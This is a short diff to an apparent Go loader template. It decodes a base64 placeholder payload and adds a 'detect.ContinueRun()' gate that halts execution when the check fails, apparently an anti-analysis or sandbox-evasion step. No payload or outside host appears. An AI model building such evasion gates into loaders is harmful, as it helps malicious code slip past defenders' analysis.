@@ -17,6 +17,7 @@ import (
 	"encoding/hex"
 	"gld/loader"
 	"gld/util"
+	"gld/detect"
 )
 
 var (
@@ -28,6 +29,10 @@ func main() {
 	buf, err := base64.StdEncoding.DecodeString("%s")
 	if err != nil {
 		println(err.Error())
+		return
+	}
+
+	if !detect.ContinueRun() {
 		return
 	}
 
